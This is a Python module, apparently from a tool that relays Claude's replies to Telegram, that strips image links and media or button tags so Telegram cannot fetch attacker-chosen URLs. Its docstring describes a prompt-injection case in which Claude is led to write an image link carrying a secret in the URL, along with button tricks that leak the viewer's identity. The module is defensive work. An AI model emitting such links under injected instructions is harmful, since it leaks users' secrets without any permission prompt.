"""Keep the text aipager sends from making Telegram fetch an address.

A rich message's Markdown turns ``![alt](url)`` into a media block, and
raw HTML inside it (``<img>``, ``<video>``, ``<audio>``, ``<figure>``,
``<tg-document>``, ``<tg-collage>``, ``<tg-slideshow>``) does the same:
Telegram's servers download the URL to show it (Bot API "Rich Markdown
style", "Media blocks support only HTTP and HTTPS URLs"). Claude's
answer, its prose on the busy card, agent descriptions and tool
arguments all reach ``sendRichMessage`` / ``editMessageText`` as written,
so a prompt injection that makes Claude write
``![x](https://host/?d=<secret>)`` would leak the secret through
Telegram with no tool call and no permission prompt.

:func:`neutralize_media` runs on every rich payload in
``rich_message`` (the only two places one is built), so no caller can
forget it. aipager's own Markdown uses none of this syntax.

Two layers:

1. Cosmetic, outside code: a well-formed inline image becomes a plain
   link ``[alt](url)`` (the URL as its text when the alt is empty), so the
   reader still sees where it pointed.
2. The guarantee, everywhere, code included: every ``![`` left becomes
   ``!\\[`` and every ``<`` that opens one of the media or button tags
   becomes ``&lt;``. Both are safe whether or not Telegram honours the
   escape: an unescaped backslash or entity is shown as itself, and
   neither leaves a ``![`` or a ``<img`` behind. Code is not skipped on
   purpose: a code detector that disagrees with Telegram's parser (an
   HTML block swallowing a fence line, say) would hide a live image from
   this layer. The cost is a visible ``\\`` or ``&lt;`` in a code block
   that contains one of these (an HTML snippet with ``<img>``, say).

The escapes can make a message a few characters longer than its caller
measured (``&lt;`` for ``<``, a URL as the text of its link). A message
already at Telegram's limit is then refused (an answer falls back to
plain text, previews off), which leaks nothing.

``<tg-button>`` is included although it fetches nothing: a ``web_app``
button in Claude's text would open any page as a Mini App with the
viewer's signed Telegram data, and a ``login_url`` one sends the
viewer's identity. Buttons are aipager's to draw, never Claude's.
"""

from __future__ import annotations

import re

# Tags that make Telegram fetch a URL (media), or that would let Claude's
# text draw a button. Longest first so the alternation cannot stop short.
_TAGS = sorted(
    (
        "img", "video", "audio", "source", "picture", "figure",
        "tg-document", "tg-collage", "tg-slideshow",
        "tg-button", "tg-button-row",
        "iframe", "embed", "object",
    ),
    key=len, reverse=True,
)

# `<` (optionally `</`) opening one of _TAGS, any case. A tag name ends at
# whitespace, `/` or `>` (CommonMark and HTML alike), so `<imgx>` or a
# shell redirect such as `<source.sql` is left alone.
_TAG_OPEN = re.compile(
    r"<(?=/?(?:" + "|".join(re.escape(t) for t in _TAGS) + r")[\s/>])",
    re.IGNORECASE,
)

_IMAGE_START = re.compile(r"!\[")

# A well-formed inline image with an optional title, on one line. It runs
# on the event loop for every rich send and card edit, so it must stay
# linear: no class it repeats holds `[`, `]` or `(`, so a match attempt
# ends at the next `![`, and no two adjacent repeats compete for the same
# characters beyond one run of blanks (the hostile-line tests time it).
_INLINE_IMAGE = re.compile(
    r"!\[(?P<alt>[^\[\]\n]*)\]"
    r"\([\x20\t]*<?(?P<url>[^\s<>()]+)>?"
    r"(?:[\x20\t]+(?:\"[^\"\n]*\"|'[^'\n]*'|\([^()\n]*\)))?[\x20\t]*\)"
)

_FENCE = re.compile(r"^ {0,3}(`{3,}|~{3,})")
_TICKS = re.compile(r"`+")


def _image_as_link(m: re.Match) -> str:
    alt = m.group("alt").strip()
    url = m.group("url")
    return f"[{alt or url}]({url})"


def _code_spans(line: str) -> list[tuple[int, int]]:
    """The inline code spans of *line*, as ``(start, end)``: a run of
    backticks up to the next run of the same length. Linear in the
    number of runs (a regex with a backreference is not: a few thousand
    backticks took it minutes)."""
    runs = [(m.start(), m.end()) for m in _TICKS.finditer(line)]
    # For each run, the index of the next run of the same length.
    nxt = [-1] * len(runs)
    last: dict[int, int] = {}
    for i in range(len(runs) - 1, -1, -1):
        n = runs[i][1] - runs[i][0]
        nxt[i] = last.get(n, -1)
        last[n] = i
    spans: list[tuple[int, int]] = []
    i = 0
    while i < len(runs):
        j = nxt[i]
        if j == -1:
            i += 1  # no closing run: these backticks are literal
            continue
        spans.append((runs[i][0], runs[j][1]))
        i = j + 1
    return spans


def _rewrite_prose(line: str) -> str:
    """Layer 1 on one non-fenced line, leaving inline code spans alone."""
    out: list[str] = []
    pos = 0
    for start, end in _code_spans(line):
        out.append(_INLINE_IMAGE.sub(_image_as_link, line[pos:start]))
        out.append(line[start:end])
        pos = end
    out.append(_INLINE_IMAGE.sub(_image_as_link, line[pos:]))
    return "".join(out)


def _rewrite_images(markdown: str) -> str:
    lines = markdown.split("\n")
    fence: str | None = None
    for i, line in enumerate(lines):
        m = _FENCE.match(line)
        if fence is None:
            if m:
                fence = m.group(1)
                continue
            if "![" in line:
                lines[i] = _rewrite_prose(line)
        elif m and m.group(1)[0] == fence[0] and len(m.group(1)) >= len(fence) \
                and not line[m.end():].strip():
            fence = None
    return "\n".join(lines)


def neutralize_media(markdown: str) -> str:
    """*markdown* with no media block and no button left in it.

    Idempotent, and a no-op on text without ``![`` or one of the tags.
    """
    if not markdown:
        return markdown
    text = markdown
    if "![" in text:
        text = _IMAGE_START.sub(r"!\\[", _rewrite_images(text))
    if "<" in text:
        text = _TAG_OPEN.sub("&lt;", text)
    return text
